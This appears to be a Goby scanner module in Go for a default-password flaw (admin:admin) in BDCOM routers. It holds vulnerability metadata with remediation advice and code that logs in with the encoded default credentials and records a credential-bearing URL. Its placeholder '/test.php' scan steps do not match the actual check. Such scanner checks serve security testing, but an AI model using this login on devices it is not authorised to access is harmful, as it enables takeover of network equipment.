package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "BDCOM Boda Router Weak Password Vulnerability",
    "Description": "<p>BDCOM is a router produced by Shanghai Boda.</p><p>BDCOM Borda routers have a default password of admin:admin, attackers can use the default password to log in to the background, seize administrator privileges, and control the entire website.</p>",
    "Product": "Bdcom-Router",
    "Homepage": "http://www.bdcom.com.cn/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-08-10",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "header=\"BDCOM\" || banner=\"BDCOM\"",
    "GobyQuery": "header=\"BDCOM\" || banner=\"BDCOM\"",
    "Level": "3",
    "Impact": "<p>BDCOM Borda routers have a default password of admin:admin, attackers can use the default password to log in to the background, seize administrator privileges, and control the entire website.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://www.bdcom.com.cn/"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "BDCOM 博达路由器弱口令漏洞",
            "Product": "博达通信-路由器",
            "Description": "<p>BDCOM 是上海博达生产的一款路由器设备。<br></p><p>BDCOM 博达路由器存在默认口令 admin:admin，攻击者可以使用默认密码登录后台，夺取管理员权限，控制整个网站。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可以使用默认密码登录后台，夺取管理员权限，控制整个网站。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "BDCOM Boda Router Weak Password Vulnerability",
            "Product": "Bdcom-Router",
            "Description": "<p>BDCOM is a router produced by Shanghai Boda.</p><p>BDCOM Borda routers have a default password of admin:admin, attackers can use the default password to log in to the background, seize administrator privileges, and control the entire website.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>BDCOM Borda routers have a default password of admin:admin, attackers can use the default password to log in to the background, seize administrator privileges, and control the entire website.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10931"
}`

	sendPayloada3823d56 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/")
		cfg.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloada3823d56(u)
			if err != nil {
				return false
			}
			result := rsp.StatusCode == 302 && strings.HasPrefix(rsp.Cookie, "GSESSIONID=")
			if result {
				ss.VulURL = u.Scheme() + "://admin:admin@" + u.HostInfo
			}
			return result
		}, nil,
	))
}